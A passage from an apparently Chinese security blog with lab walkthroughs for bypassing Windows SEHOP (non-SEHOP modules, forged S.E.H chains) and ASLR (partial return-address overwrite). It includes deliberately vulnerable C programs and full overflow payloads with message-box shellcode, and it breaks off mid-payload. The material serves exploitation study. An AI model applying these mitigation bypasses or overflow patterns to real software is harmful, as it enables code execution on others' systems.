S.E.H，而是攻击函数返回地址或者虚函数等。 （ 2）利用未启用 SEHOP 的模块。 （ 3）伪造 S.E.H 链 攻击返回地址 这种方法需要一定的运气。如果您能够碰到一个程序，他启用了 SEHOP 但是未启用 GS，或者启用了 GS 但是刚好被攻击的函数没有 GS 保护，什么都不要多说了，直接攻击函数返回地址。 攻击虚函数 无论 SEHOP 有多么的强大，它保护的也只是 S.E.H，对于 S.E.H 以外的东西是不提供保护的。所以我们依然可以通过攻击虚函数表来劫持程序流程，这个过程不涉及任何异常处理。之前我们做过，在此就不过多介绍了。 利用未启用 SEHOP 的模块 在程序的编译属性里没有提供禁用 SEHOP 这个选项，但是出于兼容性的考虑还是对一些程序禁用了 SEHOP，如经过 Armadilo 加壳的软件。 操作系统会根据 PE 头中 MajorLinkerVersion 和 MinorLinkerVersion 两个选项来判断是否为程序禁用 SEHOP。可以将这两个选项分别设置为 0x53 和 0x52 来模拟经过 Armadilo 加壳的程序，从而达到禁用 SEHOP 的目的。 禁用 SEHOP 后，还需要搞定 SafeSEH，所以我们在 “利用未启用 SafeSEH 模块” 实验基础上完成演示。 推荐使用的环境 备 注 操作系统 Windows 7 EXE 编译器 Visual Studio 2008 DLL 编译器 VC++ 6.0 将 dll 基址设置为 0x11120000 系统 SEHOP 启用 程序 DEP 关闭 程序 ASLR EXE 随意， DLL 禁用 编译选项 禁用优化选项 build 版本 release 版本 实验步骤 编译一个不启用 SafeSEH 的 DLL。 我们在《亡羊补牢：SafeSEH》中介绍过，这里就不过多赘述，直接放出源码。 1234567891011121314//SEH_NOSafeSEH_JUMP.DLL#include&quot;stdafx.h&quot;BOOL APIENTRY DllMain( HANDLE hModule,DWORD ul_reason_for_call, LPVOID lpReserved)&#123; return TRUE;&#125;void jump()&#123; __asm&#123; pop eax pop eax retn &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263//SEH_NOSafeSEH.EXE#include &quot;stdafx.h&quot;#include &lt;string.h&gt;#include &lt;windows.h&gt;char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x68\\x10\\x12\\x11&quot;//address of pop pop retn in No_SafeSEH module&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot;;DWORD MyException(void)&#123; printf(&quot;There is an exception&quot;); getchar(); return 1;&#125;void test(char * input)&#123; char str[200]; strcpy(str,input); __asm int 3 int zero=0; __try &#123; zero=1/zero; &#125; __except(MyException()) &#123; &#125;&#125;int _tmain(int argc, _TCHAR* argv[])&#123; HINSTANCE hInst = LoadLibrary(_T(&quot;SEH_NOSafeSEH_JUMP.dll&quot;));//load No_SafeSEH module char str[200]; __asm int 3 test(shellcode); return 0;&#125; 为 SEH_NOSaeSEH_JUMP.dll 禁 用 SEHOP 用 CFF Explorer 打开 SEH_NOSaeSEH_JUMP.dll 后在 Optional header 选项页中来进行设置，分别将 MajorLinkerVersion 和MinorLinkerVersion 设置为 0x53 和 0x52。 对主程序进行一定的修改 （1）修改弹出对话框的 shellcode，让其可以在 windows 7下正常弹出。 windows xp下的SafeSEH windows 7下的SafeSEH 由于在 Windows 7 下 PEB_LDR_DATA 指向加载模块列表中第二个模块位置被 KERNELBASE.dll 占据， kernel32.dll 的位置由第二个变为第三个，所以要对 shellcode 做出相应修改。在原来 shellcode 的第 52 个字节之后插入 “\\x8B\\x09”，该机器码对应的汇编语句为MOV ECX,[ECX]，来让程序多跳转一次，定位到 kernel32.dll。修改后的对话框 shellcode 如下。 1234567891011121314Shellcode=&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09&quot;&quot;\\x8B\\x09&quot; //在这增加机器码\\x8B\\x09，它对应的汇编为 mov ecx,[ecx]&quot;\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot; （2）禁用程序的 DEP，通过取消程序的/NXCOMPAT 链接选项。 伪造 S.E.H 链表 实验原理 为了提高溢出的成功率，我们在本实验中关闭系统的 ASLR，因为伪造 S.E.H 链时需要用到 FinalExceptionHandler 指向的地址。所以这里只讨论这种方法理论上的可行性。 伪造 S.E.H 链绕过 SEHOP 所需条件： （ 1）图 14.5.1 中的 0xXXXXXXXX 地址必须指向当前栈中，而且必须能够被 4 整除。 （ 2） 0xXXXXXXXX 处存放的异常处理记录作为 S.E.H 链的最后一项，其异常处理函数指针必须指向终极异常处理函数。 （ 3）突破 SEHOP 检查后，溢出程序还需搞定 SafeSEH。 为了避免实验过于复杂，本次实验我们在 “利用未启用 SafeSEH 模块绕过 SafeSEH” 的基础 上 进 行 ， 所以不用再考虑 SafeSEH 的问题，只需确定 0xXXXXXXXX 的值和 FinalExceptionHandler 指向的地址。 实验代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include&quot;stdafx.h&quot;#include&lt;string.h&gt;#include&lt;windows.h&gt;char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x14\\xFF\\x12\\x00&quot;//address of last seh record &quot;\\x68\\x10\\x12\\x11&quot;//address of pop pop retn in No_SafeSEH module &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot; &quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot; &quot;\\x49\\x1C\\x8B\\x09&quot; &quot;\\x8B\\x09&quot;//在这增加机器码\\x8B\\x09，它对应的汇编为 mov ecx,[ecx] &quot;\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot; &quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot; &quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot; &quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot; &quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot; &quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot; &quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90&quot; &quot;\\xFF\\xFF\\xFF\\xFF&quot;// the fake seh record &quot;\\x75\\xA8\\xF7\\x77&quot; ;DWORD MyException(void)&#123; printf(&quot;There is an exception&quot;); getchar(); return 1;&#125;void test(char * input)&#123; char str[200]; memcpy(str,input,412); int zero=0; __try &#123; zero=1/zero; &#125; __except(MyException()) &#123; &#125;&#125;int _tmain(int argc, _TCHAR* argv[])&#123; HINSTANCE hInst = LoadLibrary(_T(&quot;SEH_NOSafeSEH_JUMP.dll&quot;));//load No_SafeSEH module char str[200]; test(shellcode); return 0;&#125; 实验思路： （ 1）通过未启用 SafeSEH 的 SEH_NOSaeSEH_JUMP.dll 来绕过 SafeSEH。 （ 2）通过伪造 S.E.H 链，造成 S.E.H 链未被破坏的假象来绕过 SEHOP。 （ 3） SEH_NOSafeSEH 中的 test 函数通过向 str 复制超长字符串造成 str 溢出，进而覆盖程序的 S.E.H 信息。 （ 4）使用 SEH_NOSafeSEH_JUMP.DLL 中的 “pop pop retn” 指令地址覆盖异常处理函数地址，然后通过制造除 0 异常，将程序转入异常处理。通过劫持异常处理流程，程序转入 SEH_NOSaeSEH_JUMP.DLL 中执行“pop pop retn” 指令，在执行 retn 后程序转入 shellcode 执行。 推荐使用的环境 备 注 操作系统 W Windows 7 EXE 编译器 Visual Studio 2008 DLL 编译器 VC++ 6.0 将 dll 基址设置为 0x11120000 系统 SEHOP 启用 程序 DEP 关闭 系统 ASLR 关闭 编译选项 禁用优化选项 build 版本 release 版本 说明：实验中的 FinalExceptionHandler 指向的地址可能在您的系统中会有所变化 实验步骤 先启用 SEHOP 把 MajorLinkerVersion 和 MinorLinkerVersion 的值分别设为 0x06 和 0x00，排除上一个实验的影响。 确定 FinalExceptionHandler 指向的地址 用 OllyDbg 加载好程序后直接观察堆栈的底部就可以看到 FinalExceptionHandler 指向的地址，本次实验中地址为 0x770DAB2D。 伪造 S.E.H 链 先看一下 S.E.H 的覆盖情况 按 F9 键让程序运行，程序会在除零异常发生时中断。 由上图可得，str[]的起始地址为 0x0012FD80。 位于 0x0012FE58 处的栈顶异常处理记录已经被覆盖为 0x90909090，S.E.H 链已经被破坏。前面需用 216 个 0x90 填充。 确定伪造的异常处理记录放置位置 首先，不能直接使用程序自带的终极异常处理记录，因为该记录位于 0x0012FFE4，它作为机器码被执行时，会影响程序正常运行，您可自行调试观察一下。 不如在距离弹出对话框机器码结束最近的内存放置伪造的异常处理记录，当然这个地址不仅可以被 4 整除而且还不能影响程序的执行，本次实验选择 0x0012FF14。 部署 shellcode 12345678910111213141516171819202122232425262728293031323334char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x14\\xFF\\x12\\x00&quot;//address of last seh record &quot;\\x68\\x10\\x12\\x11&quot;//address of pop pop retn in No_SafeSEH module &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot; &quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot; &quot;\\x49\\x1C\\x8B\\x09&quot; &quot;\\x8B\\x09&quot;//在这增加机器码\\x8B\\x09，它对应的汇编为 mov ecx,[ecx] &quot;\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot; &quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot; &quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot; &quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot; &quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot; &quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot; &quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90&quot; &quot;\\xFF\\xFF\\xFF\\xFF&quot;// the fake seh record &quot;\\x75\\xA8\\xF7\\x77&quot; ; 编译运行，就能看到 ”failwest“ 对话框了。","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"SEHOP","slug":"SEHOP","permalink":"https://www.rgzzplus.com/tags/SEHOP/"}]},{"title":"在内存中躲猫猫：ASLR","slug":"在内存中躲猫猫：ASLR","date":"2022-06-27T14:05:51.000Z","updated":"2022-08-01T11:17:02.414Z","comments":true,"path":"2022/06/27/在内存中躲猫猫：ASLR/","link":"","permalink":"https://www.rgzzplus.com/2022/06/27/%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E8%BA%B2%E7%8C%AB%E7%8C%AB%EF%BC%9AASLR/","excerpt":"","text":"[toc] 内存随机化保护机制的原理 前面的所有漏洞利用都有一个共同特征：都需要确定一个明确的跳转地址。而 ASLR（Address Space Layout Randomization）技术就是通过使用随机的基址加载程序，从而干扰 shellcode 定位的一种保护机制。 ASLR 的实现需要程序和操作系统的双重支持，其中程序的支持不是必需的。 支持 ASLR 的程序在它的 PE 头中会设置 IMAGE_DLL_CHARACTERISTICS_ DYNAMIC_BASE 标识来说明其支持 ASLR。在Visual Studio 2008 (VS 9.0)中，可以在通过菜单中的 Project→project Properties→ Configuration Pr operties→ Linker→ Advanced→ Randomized Base Address 选项对 /dynmicbase 链接选项（启用则支持 ASLR）进行设置。 映像随机化 映像随机化是在 PE 文件映射到内存时，对其加载的虚拟地址进行随机化处理，这个地址是在系统启动时确定的，系统重启后这个地址会变化。 微软在系统中设置了映像随机化的开关，通过设置注册表中 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\MoveImages 的键值来设定映像随机化的工作模式。 设置为 0 时映像随机化将禁用。 设置为 -1 时强制对可随机化的映像进行处 理，无论是否设置 IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE 标识。 设置为其他值时为正常工作模式，只对具有随机化处理标识的映像进行处理。 如果注册表中不存在 MoveImages，大家可以手工建立名称为 MoveImages，类型为 DWORD的值，并根据需要设置它的值，如下图所示。 堆栈随机化 堆栈随机化是在程序运行时随机的选择堆栈的基址，在程序打开时确定。也就是说同一个程序任意两次运行时的堆栈基址都是不同的，进而各变量在内存中的位置也就是不确定的。 测试一下堆栈随机化对变量在内存位置的影响，我们分别在堆和栈上各申请 100 个字节的空间，然后在 Windows XP 和 Windows Vista 下面各运行两次。 12345678int _tmain(int argc, _TCHAR *argv[])&#123; char * heap=(char *)malloc(100); char stack[100]; printf(&quot;Address of heap:%#0.4x\\nAddress of stack:%#0.4x&quot;,heap, stack); getchar(); return 0;&#125; Windows vista：两次申请空间的起始地址不同 Windows XP：两次申请空间的起始地址完全相同 PEB 与 TEB 随机化 微软在 XP SP2 之后不再使用固定的 PEB 基址 0x7FFDF000 和 TEB 基址 0x7FFDE000，而是使用具有一定随机性的基址，这就增加了攻击 PEB 中的函数指针的难度。 获取当前进程的 TEB 和 PEB ，TEB 存放在 FS:0 和 FS:[0x18]处， PEB 存放在 TEB 偏移 0x30 的位置。 1234567891011121314int _tmain(int argc, _TCHAR *argv[])&#123; unsigned int teb; unsigned int peb; __asm&#123; mov eax,FS:[0x18] mov teb,eax mov eax,dwordptr[eax+0x30] mov peb,eax &#125; printf(&quot;PEB:%#x\\nTEB:%#x&quot;,peb,teb); getchar(); return 0;&#125; 可以从下面的结果看出，PEB 和 TEB 的随机效果不是很好。 ASLR 的弱点 （1）在映像随机化中，虽然模块的加载基址变化了，但是各模块的入口点（ Entry 那列）地址的低位 2 个字节是不变的，也就是说映像随机化只是对加载基址的前 2 个字节做了随机处理。地址的前 2 个字节是随机的，而后 2 个字节是固定的。 （2）在堆栈随机化中，将每个线程的堆栈基址都做了随机化处理，使得程序每次运行时变量的地址都不相同。好处是可以防止精准攻击。例如我们需要根据 shellcode 的起始地址直接跳转到 shellcode 执行，但是自从 JMP ESP 跳板指令开始使用后溢出时很少直接跳到 shellcode 中执行了；另外在浏览器攻击方面很流行的 heap spray 等技术，这些技术也是不需要精准跳转的，只需要跳转到一个大概的位置即可。所以这项措施对于目前的溢出手段影响有限。 （3）在PEB 和 TEB 的随机化中，它们的随机化程度很低。 攻击未启用 ASLR 的模块 ASLR 仅仅是项安全机制，不是什么行业标准， 不支持 ASLR 的软件有很多。不支持 ASLR 意味着加载基址固定，如果我们能够在当前进程空间中找到一个这样的模块，就可以利用它里边的指令来做跳板了，直接无视 ASLR。 本次实验需要用到 IE 和 Flash，由于这两项技术目前已经淘汰，并且 Flash无法找到实验版本（Flash Player ActiveX 9.0.262），所以我们先跳过这个实验。 利用部分覆盖进行定位内存地址 之所以能利用部分覆盖进行定位内存地址，有两个原因，一是**映像随机化只是对映像加载基址的前2个字节做随机化处理。**如果我们借鉴 “off by one” 的思想，只覆盖这个地址的最后一个字节（或者两个字节），那么我们就能在一定范围内控制程序。二是因为 ASLR 只是随机化了映像的加载基址，而没有对指令序列进行随机化，指令序列相对于基址的位置还是不变的。 实验代码： 12345678910111213141516171819202122#include&quot;stdafx.h&quot;#include&quot;stdlib.h&quot;charshellcode[]= &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot; &quot;……&quot; &quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;……&quot; &quot;\\x90\\x90\\x90\\x90&quot; &quot;\\x1C\\x14&quot; ;char * test()&#123; char tt[256]; memcpy(tt,shellcode,262); return tt;&#125;int _tmain(int argc, _TCHAR *argv[])&#123; char temp[200]; test(); return 0;&#125; 实验思路： （ 1）为了更直观地反映绕过 ASLR 的过程，本次实验编译的程序不启用 GS。 （ 2）编译程序时禁用 DEP。 （ 3） test 函数中通过复制超长字符串可以溢出并覆盖函数返回地址。 （ 4）复制结束后， test 函数返回 tt 字符数组的首地址。 （ 5）在相对程序加载基址 0x0000~0xFFFF 的范围内，找到一条跳板指令，并用它地址的后 2 个字节覆盖返回地址的后两个字节。 （ 6）采用这种类似 “相对寻址” 的方法来动态确定跳板指令的地址，以实现跳板指令的通用性。 注意：test 函数返回的 tt 字符数组的首地址是没有实际意义的，因为 tt 的空间是在栈上的，程序从 test 函数返回后 tt 字符数组所在的空间就会被释放。 推荐使用的环境 操作系统 Windows Vista SP2 DEP 状态 Optin （Vista 默认状态） 编译器 Visual Studio 2008 优化选项 禁用优化选项 GS 选项 GS 关闭 DEP 选项 /NXCOMPAT:NO build 版本 release 版本 实验步骤： 计算能覆盖到返回地址的填充长度 调试得到，test() 的返回地址位于 001FF940处，tt 的起始地址位于 0x001FF83C处，相距 260 个字节，所以我们可以使用 261~262 这两个字节来覆盖返回地址的后两位。 寻找跳板指令 1234567891011121314151617181920char shellcode[]= &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; &quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot; 